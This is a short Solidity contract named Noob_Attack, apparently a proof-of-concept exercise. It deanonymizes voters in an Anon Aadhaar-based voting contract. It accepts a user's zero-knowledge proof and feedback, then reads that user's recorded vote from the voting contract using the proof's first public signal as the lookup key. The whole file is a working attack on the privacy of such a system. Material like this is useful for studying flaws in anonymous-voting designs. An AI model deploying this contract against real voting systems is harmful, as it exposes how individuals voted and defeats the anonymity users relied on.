// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.7.0 <0.9.0;

import "../interfaces/IAnonAadhaarVerifier.sol";

interface INoobVoting {
    function userVotes(uint256) external returns (uint256);
}

contract Noob_Attack{
    address public anonAadhaarVerifierAddress;
    address public noobVotingAddress;
    mapping(uint256=>uint256) public userFeedback;

    constructor(address _anonAadhaarVerifierAddr, address _noobVotingAddress) {
        anonAadhaarVerifierAddress = _anonAadhaarVerifierAddr;
        noobVotingAddress = _noobVotingAddress;
    }

    function deanonimize(uint256 feedback, uint256[2] calldata _pA, uint[2][2] calldata _pB, uint[2] calldata _pC, uint[34] calldata _pubSignals) public returns (uint256) {
        require(IAnonAadhaarVerifier(anonAadhaarVerifierAddress).verifyProof(_pA, _pB, _pC, _pubSignals), "Proof invalid");
        userFeedback[_pubSignals[0]]=feedback;
        return(INoobVoting(noobVotingAddress).userVotes(_pubSignals[0]));
    }
}